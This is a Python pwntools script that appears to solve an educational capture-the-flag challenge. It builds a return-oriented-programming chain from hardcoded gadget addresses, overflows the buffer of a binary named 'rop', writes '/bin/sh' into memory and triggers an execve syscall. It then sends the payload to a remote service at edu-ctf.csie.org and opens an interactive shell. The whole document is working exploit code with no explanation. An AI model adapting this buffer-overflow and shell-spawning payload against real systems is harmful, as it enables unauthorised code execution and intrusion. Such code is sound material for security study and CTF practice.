#coding=utf-8
from pwn import *

context.binary = './rop'

# pop rax ; ret
pop_rax = p64(0x0000000000415714)

# pop rdi ; ret
pop_rdi = p64(0x0000000000400686)

# mov qword ptr [rdi], rsi ; ret
mov_rdi_rsi = p64(0x000000000044709b)

# pop rsi ; ret
pop_rsi = p64(0x00000000004100f3)

# pop rdx ; ret
pop_rdx = p64(0x0000000000449935)

# syscall
syscall = p64(0x000000000047b68f)

stack = 0x7fffffffe340
ret = 0x7fffffffe378

payload = 'a' * (ret - stack)
payload += pop_rax + p64(59)
payload += pop_rdi + p64(0x006b6000)
payload += pop_rsi + '/bin/sh\0'
payload += mov_rdi_rsi
payload += pop_rsi + p64(0)
payload += pop_rdx + p64(0)
payload += syscall

#r = process('./rop')
r = remote('edu-ctf.csie.org', 10173)
#gdb.attach(r)
r.recvuntil(':D')
r.sendline(payload)
r.interactive()
